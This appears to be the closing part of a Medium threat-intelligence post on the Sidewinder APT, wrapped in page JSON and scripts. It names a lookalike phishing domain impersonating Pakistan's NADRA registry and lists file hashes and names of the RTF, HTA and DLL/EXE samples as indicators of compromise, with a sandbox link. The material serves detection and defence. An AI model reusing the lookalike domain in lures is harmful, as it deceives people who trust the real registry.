attackers:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*UNB3nsU-2fey_uCyR0BC4w.png":{"__typename":"ImageMetadata","id":"1*UNB3nsU-2fey_uCyR0BC4w.png","originalHeight":1054,"originalWidth":1024,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:9376201130db_121":{"__typename":"Paragraph","id":"9376201130db_121","name":"4a12","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*UNB3nsU-2fey_uCyR0BC4w.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_122":{"__typename":"Paragraph","id":"9376201130db_122","name":"366b","type":"P","href":null,"layout":null,"metadata":null,"text":"We have www.nadra.gov.pk.d-dns.co cleary targetted.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":8,"end":33,"href":"http:\u002F\u002Fwww.nadra.gov.pk.d-dns.co","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_123":{"__typename":"Paragraph","id":"9376201130db_123","name":"9348","type":"P","href":null,"layout":null,"metadata":null,"text":"The nadra is the National Database of and Registration Authority.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_124":{"__typename":"Paragraph","id":"9376201130db_124","name":"8c1a","type":"P","href":null,"layout":null,"metadata":null,"text":"If you check the metada of RTF, Rashid Memorial is the author of the document.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_125":{"__typename":"Paragraph","id":"9376201130db_125","name":"3030","type":"P","href":null,"layout":null,"metadata":null,"text":"This name is really known by the navy pakistani because “Rashid Memorial Welfare Organization (RMWO) was set up by a group of dedicated retired PAF officers in 1998 in memory of Flt. Lt. Rashid Ahmed Khan, who embraced ‘Shahadat’ on 13th December, 1997 when his aircraft caught fire above a densely populated area.”","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_126":{"__typename":"Paragraph","id":"9376201130db_126","name":"b8d4","type":"H3","href":null,"layout":null,"metadata":null,"text":"IOCs","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_127":{"__typename":"Paragraph","id":"9376201130db_127","name":"0510","type":"P","href":null,"layout":null,"metadata":null,"text":"File RTF:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_128":{"__typename":"Paragraph","id":"9376201130db_128","name":"43cc","type":"P","href":null,"layout":null,"metadata":null,"text":"892859ea9d86fc441b24222148db52eb33cd106c2ac68eafbe83ab0064215488","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_129":{"__typename":"Paragraph","id":"9376201130db_129","name":"d710","type":"P","href":null,"layout":null,"metadata":null,"text":"08b9b5b7592004b8733544df1029e2fc085d82db1ba488a43830df49bbbc73b6","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_130":{"__typename":"Paragraph","id":"9376201130db_130","name":"e810","type":"P","href":null,"layout":null,"metadata":null,"text":"hta:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_131":{"__typename":"Paragraph","id":"9376201130db_131","name":"18d8","type":"P","href":null,"layout":null,"metadata":null,"text":"b8cbdb36ccd666adaf2ba3628cc79578d3a05119c71dce1bb16aa39e56dea3cc","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_132":{"__typename":"Paragraph","id":"9376201130db_132","name":"3cfe","type":"P","href":null,"layout":null,"metadata":null,"text":"Executables:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_133":{"__typename":"Paragraph","id":"9376201130db_133","name":"5ec7","type":"P","href":null,"layout":null,"metadata":null,"text":"8315956b587032db14ba4e700400dffeaeb4119ef509ecf0df1bb4e80a496b59 (cmpbk32.dll)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_134":{"__typename":"Paragraph","id":"9376201130db_134","name":"841f","type":"P","href":null,"layout":null,"metadata":null,"text":"13497aab3521abbaa654b51f375114e419b1bb774caa8c67cf52775095b17423 (winset.exe)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_135":{"__typename":"Paragraph","id":"9376201130db_135","name":"3b71","type":"P","href":null,"layout":null,"metadata":null,"text":"Sandbox execution:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_136":{"__typename":"Paragraph","id":"9376201130db_136","name":"4573","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"892859ea9d86fc441b24222148db52eb33cd106c2ac68eafbe83ab0064215488.rtf (MD5…\nInteractive malware hunting service. Any environments ready for live testing most type of threats. Without install…app.any.run","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":201,"href":"https:\u002F\u002Fapp.any.run\u002Ftasks\u002F779ba068-a9d5-490b-a1ec-7ebaa81e5d57","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":74,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":75,"end":190,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fapp.any.run\u002Ftasks\u002F779ba068-a9d5-490b-a1ec-7ebaa81e5d57","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*BQtQCP2DxBVQoBT6"}},"Paragraph:9376201130db_137":{"__typename":"Paragraph","id":"9376201130db_137","name":"e047","type":"H3","href":null,"layout":null,"metadata":null,"text":"Credits:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_138":{"__typename":"Paragraph","id":"9376201130db_138","name":"054f","type":"P","href":null,"layout":null,"metadata":null,"text":"Thanks to Benjamin Piot for exchange about this cases !","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"UserViewerEdge:userId:11d98531eebe-viewerId:lo_bdf918410d03":{"__typename":"UserViewerEdge","id":"userId:11d98531eebe-viewerId:lo_bdf918410d03","isMuting":false},"PostViewerEdge:postId:5bc1a7e7c84c-viewerId:lo_bdf918410d03":{"__typename":"PostViewerEdge","shouldIndexPostForExternalSearch":true,"id":"postId:5bc1a7e7c84c-viewerId:lo_bdf918410d03"},"Tag:threat-intelligence":{"__typename":"Tag","id":"threat-intelligence","displayTitle":"Threat Intelligence","normalizedTagSlug":"threat-intelligence"},"Tag:malware-analysis":{"__typename":"Tag","id":"malware-analysis","displayTitle":"Malware Analysis","normalizedTagSlug":"malware-analysis"},"Post:5bc1a7e7c84c":{"__typename":"Post","id":"5bc1a7e7c84c","collection":null,"content({\"postMeteringOptions\":{\"referrer\":\"\"}})":{"__typename":"PostContent","isLockedPreviewOnly":false,"bodyModel":{"__typename":"RichText","sections":[{"__typename":"Section","name":"6fa5","startIndex":0,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null},{"__typename":"Section","name":"2ea6","startIndex":113,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null}],"paragraphs":[{"__ref":"Paragraph:9376201130db_0"},{"__ref":"Paragraph:9376201130db_1"},{"__ref":"Paragraph:9376201130db_2"},{"__ref":"Paragraph:9376201130db_3"},{"__ref":"Paragraph:9376201130db_4"},{"__ref":"Paragraph:9376201130db_5"},{"__ref":"Paragraph:9376201130db_6"},{"__ref":"Paragraph:9376201130db_7"},{"__ref":"Paragraph:9376201130db_8"},{"__ref":"Paragraph:9376201130db_9"},{"__ref":"Paragraph:9376201130db_10"},{"__ref":"Paragraph:9376201130db_11"},{"__ref":"Paragraph:9376201130db_12"},{"__ref":"Paragraph:9376201130db_13"},{"__ref":"Paragraph:9376201130db_14"},{"__ref":"Paragraph:9376201130db_15"},{"__ref":"Paragraph:9376201130db_16"},{"__ref":"Paragraph:9376201130db_17"},{"__ref":"Paragraph:9376201130db_18"},{"__ref":"Paragraph:9376201130db_19"},{"__ref":"Paragraph:9376201130db_20"},{"__ref":"Paragraph:9376201130db_21"},{"__ref":"Paragraph:9376201130db_22"},{"__ref":"Paragraph:9376201130db_23"},{"__ref":"Paragraph:9376201130db_24"},{"__ref":"Paragraph:9376201130db_25"},{"__ref":"Paragraph:9376201130db_26"},{"__ref":"Paragraph:9376201130db_27"},{"__ref":"Paragraph:9376201130db_28"},{"__ref":"Paragraph:9376201130db_29"},{"__ref":"Paragraph:9376201130db_30"},{"__ref":"Paragraph:9376201130db_31"},{"__ref":"Paragraph:9376201130db_32"},{"__ref":"Paragraph:9376201130db_33"},{"__ref":"Paragraph:9376201130db_34"},{"__ref":"Paragraph:9376201130db_35"},{"__ref":"Paragraph:9376201130db_36"},{"__ref":"Paragraph:9376201130db_37"},{"__ref":"Paragraph:9376201130db_38"},{"__ref":"Paragraph:9376201130db_39"},{"__ref":"Paragraph:9376201130db_40"},{"__ref":"Paragraph:9376201130db_41"},{"__ref":"Paragraph:9376201130db_42"},{"__ref":"Paragraph:9376201130db_43"},{"__ref":"Paragraph:9376201130db_44"},{"__ref":"Paragraph:9376201130db_45"},{"__ref":"Paragraph:9376201130db_46"},{"__ref":"Paragraph:9376201130db_47"},{"__ref":"Paragraph:9376201130db_48"},{"__ref":"Paragraph:9376201130db_49"},{"__ref":"Paragraph:9376201130db_50"},{"__ref":"Paragraph:9376201130db_51"},{"__ref":"Paragraph:9376201130db_52"},{"__ref":"Paragraph:9376201130db_53"},{"__ref":"Paragraph:9376201130db_54"},{"__ref":"Paragraph:9376201130db_55"},{"__ref":"Paragraph:9376201130db_56"},{"__ref":"Paragraph:9376201130db_57"},{"__ref":"Paragraph:9376201130db_58"},{"__ref":"Paragraph:9376201130db_59"},{"__ref":"Paragraph:9376201130db_60"},{"__ref":"Paragraph:9376201130db_61"},{"__ref":"Paragraph:9376201130db_62"},{"__ref":"Paragraph:9376201130db_63"},{"__ref":"Paragraph:9376201130db_64"},{"__ref":"Paragraph:9376201130db_65"},{"__ref":"Paragraph:9376201130db_66"},{"__ref":"Paragraph:9376201130db_67"},{"__ref":"Paragraph:9376201130db_68"},{"__ref":"Paragraph:9376201130db_69"},{"__ref":"Paragraph:9376201130db_70"},{"__ref":"Paragraph:9376201130db_71"},{"__ref":"Paragraph:9376201130db_72"},{"__ref":"Paragraph:9376201130db_73"},{"__ref":"Paragraph:9376201130db_74"},{"__ref":"Paragraph:9376201130db_75"},{"__ref":"Paragraph:9376201130db_76"},{"__ref":"Paragraph:9376201130db_77"},{"__ref":"Paragraph:9376201130db_78"},{"__ref":"Paragraph:9376201130db_79"},{"__ref":"Paragraph:9376201130db_80"},{"__ref":"Paragraph:9376201130db_81"},{"__ref":"Paragraph:9376201130db_82"},{"__ref":"Paragraph:9376201130db_83"},{"__ref":"Paragraph:9376201130db_84"},{"__ref":"Paragraph:9376201130db_85"},{"__ref":"Paragraph:9376201130db_86"},{"__ref":"Paragraph:9376201130db_87"},{"__ref":"Paragraph:9376201130db_88"},{"__ref":"Paragraph:9376201130db_89"},{"__ref":"Paragraph:9376201130db_90"},{"__ref":"Paragraph:9376201130db_91"},{"__ref":"Paragraph:9376201130db_92"},{"__ref":"Paragraph:9376201130db_93"},{"__ref":"Paragraph:9376201130db_94"},{"__ref":"Paragraph:9376201130db_95"},{"__ref":"Paragraph:9376201130db_96"},{"__ref":"Paragraph:9376201130db_97"},{"__ref":"Paragraph:9376201130db_98"},{"__ref":"Paragraph:9376201130db_99"},{"__ref":"Paragraph:9376201130db_100"},{"__ref":"Paragraph:9376201130db_101"},{"__ref":"Paragraph:9376201130db_102"},{"__ref":"Paragraph:9376201130db_103"},{"__ref":"Paragraph:9376201130db_104"},{"__ref":"Paragraph:9376201130db_105"},{"__ref":"Paragraph:9376201130db_106"},{"__ref":"Paragraph:9376201130db_107"},{"__ref":"Paragraph:9376201130db_108"},{"__ref":"Paragraph:9376201130db_109"},{"__ref":"Paragraph:9376201130db_110"},{"__ref":"Paragraph:9376201130db_111"},{"__ref":"Paragraph:9376201130db_112"},{"__ref":"Paragraph:9376201130db_113"},{"__ref":"Paragraph:9376201130db_114"},{"__ref":"Paragraph:9376201130db_115"},{"__ref":"Paragraph:9376201130db_116"},{"__ref":"Paragraph:9376201130db_117"},{"__ref":"Paragraph:9376201130db_118"},{"__ref":"Paragraph:9376201130db_119"},{"__ref":"Paragraph:9376201130db_120"},{"__ref":"Paragraph:9376201130db_121"},{"__ref":"Paragraph:9376201130db_122"},{"__ref":"Paragraph:9376201130db_123"},{"__ref":"Paragraph:9376201130db_124"},{"__ref":"Paragraph:9376201130db_125"},{"__ref":"Paragraph:9376201130db_126"},{"__ref":"Paragraph:9376201130db_127"},{"__ref":"Paragraph:9376201130db_128"},{"__ref":"Paragraph:9376201130db_129"},{"__ref":"Paragraph:9376201130db_130"},{"__ref":"Paragraph:9376201130db_131"},{"__ref":"Paragraph:9376201130db_132"},{"__ref":"Paragraph:9376201130db_133"},{"__ref":"Paragraph:9376201130db_134"},{"__ref":"Paragraph:9376201130db_135"},{"__ref":"Paragraph:9376201130db_136"},{"__ref":"Paragraph:9376201130db_137"},{"__ref":"Paragraph:9376201130db_138"}]},"validatedShareKey":"","shareKeyCreator":null},"creator":{"__ref":"User:11d98531eebe"},"inResponseToEntityType":null,"isLocked":false,"isMarkedPaywallOnly":false,"lockedSource":"LOCKED_POST_SOURCE_NONE","mediumUrl":"https:\u002F\u002Fsebdraven.medium.com\u002Fapt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c","primaryTopic":null,"topics":[{"__typename":"Topic","slug":"cybersecurity"},{"__typename":"Topic","slug":"programming"}],"isLimitedState":false,"isPublished":true,"allowResponses":true,"responsesLocked":false,"visibility":"PUBLIC","latestPublishedVersion":"9376201130db","postResponses":{"__typename":"PostResponses","count":0},"responseDistribution":"NOT_DISTRIBUTED","clapCount":59,"title":"APT Sidewinder: Tricks powershell, Anti Forensics and execution side loading","isSeries":false,"sequence":null,"uniqueSlug":"apt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c","socialTitle":"","socialDek":"","canonicalUrl":"","metaDescription":"","latestPublishedAt":1531839430410,"readingTime":6.379245283018868,"previewContent":{"__typename":"PreviewContent","subtitle":"Spear phishing"},"previewImage":{"__ref":"ImageMetadata:1*UNB3nsU-2fey_uCyR0BC4w.png"},"isShortform":false,"seoTitle":"","firstPublishedAt":1531774862686,"updatedAt":1531845392349,"shortformType":"SHORTFORM_TYPE_LINK","seoDescription":"","viewerEdge":{"__ref":"PostViewerEdge:postId:5bc1a7e7c84c-viewerId:lo_bdf918410d03"},"isSuspended":false,"license":"ALL_RIGHTS_RESERVED","tags":[{"__ref":"Tag:threat-intelligence"},{"__ref":"Tag:malware-analysis"}],"isFeaturedInPublishedPublication":false,"isNewsletter":false,"statusForCollection":null,"pendingCollection":null,"detectedLanguage":"en","wordCount":1346,"layerCake":4}}</script><script>window.__MIDDLEWARE_STATE__={"session":{"xsrf":""},"cache":{"cacheStatus":"HIT"}}</script><script src="https://cdn-client.medium.com/lite/static/js/manifest.1af42850.js"></script><script src="https://cdn-client.medium.com/lite/static/js/9865.1496d74a.js"></script><script src="https://cdn-client.medium.com/lite/static/js/main.411d7ec3.js"></script><script src="https://cdn-client.medium.com/lite/static/js/instrumentation.5bef8967.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/reporting.ff22a7a5.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5049.d1ead72d.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4505.6dfaf853.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6618.db187378.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/9380.fb176dee.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2707.2278ed76.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/9977.933c1c9a.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8599.2418028f.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/3045.1cc3d8cb.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6349.3329b100.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2648.26563adf.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8393.67b7130d.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6428.1164cc97.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6199.c727247b.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5642.472363b5.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6546.5d594cfd.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6834.8aa8d357.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2107.a45f417e.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2571.6814b962.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/839.1c286b32.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6128.f8800a13.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2135.6ef5c5cf.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7975.60bcefe8.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/144.261fc28c.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5240.6281357f.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8819.c627c2bf.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8204.2636b118.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/1201.8abafe50.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/PostPage.MainContent.ddac13c4.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8414.0d800846.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/3974.8d3e0217.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2527.b9f95853.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/PostResponsesContent.8fccab9f.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/responses.editor.33e18640.chunk.js"></script><script>window.main();</script><script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'91f8804cc9df22ea',t:'MTc0MTgzNzEzNC4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"91f8804cc9df22ea","version":"2025.1.0","serverTiming":{"name":{"cfExtPri":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}},"token":"0b5f665943484354a59c39c6833f7078","b":1}' crossorigin="anonymous"></script>
</body></html>